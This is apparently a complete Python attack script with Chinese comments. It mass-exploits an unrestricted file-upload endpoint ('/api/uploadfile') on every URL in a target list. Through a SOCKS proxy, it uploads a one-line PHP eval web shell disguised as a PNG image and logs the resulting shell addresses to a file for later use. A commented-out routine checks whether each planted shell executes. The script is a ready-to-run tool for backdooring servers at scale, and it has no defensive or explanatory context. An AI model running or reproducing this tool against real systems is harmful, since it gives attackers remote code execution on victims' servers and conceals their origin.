# by xiaocheng

import requests
import urllib3
import threading
from queue import Queue
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
        # 用sock协议时只能用socks5h 不能用socks5,或者用http协议
    'http':'socks5h://127.0.0.1:1080',
    'https':'socks5h://127.0.0.1:1080'
}

class Check_Url(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue=queue
    def run(self):
        while not self.queue.empty():
            url = self.queue.get()
            try:
                upload(url)
            except:
                print("not ....")
            finally:
                self.queue.task_done()
def upload(url):
    try:
        r = requests.post(url=url,files=files,proxies=proxies,verify=False,timeout=10)
        text = (r.text).find("filepath")
        print(url)
        if (text!=-1):
            shell_url=((r.text).split('"')[-2]).replace("\\","")
            print("[+]shell地址:",shell_url)
            f = open("ok.txt",'a+')
            f.write(shell_url+"\n")
            # checkurl(shell_url)
            
        else:
            print("[-]not shell")
    except:
        print("[-]"+url+"无法访问")

# def checkurl(url):
    # try:
        # t = requests.get(url=url,proxies=proxies,verify=False).text
        # no_shell = t.find("denied")
        # if (no_shell == -1):
            # print("[+]shell地址:",url)
            # f = open("ok.txt",'a+')
            # f.write(url+"\n")
        # else:
            # print("[-]shell地址:",url+"无权限执行")
    # except:
        # print("[-]"+url+"无法访问")




if __name__=="__main__":
    files = {'file':('1.php',"<?php @eval($_POST[x]);?>",'image/png')}
    with open('url.txt','r') as f:
        queue =Queue()
        f = f.readlines()
        for i in f:
            i = i.strip("\r\n")
            url = i+"/api/uploadfile"
            queue.put(url)
        for i in range(10):
            worker = Check_Url(queue)
            worker.daemon=True
            worker.start()

        queue.join()
        print('检测完毕')
        
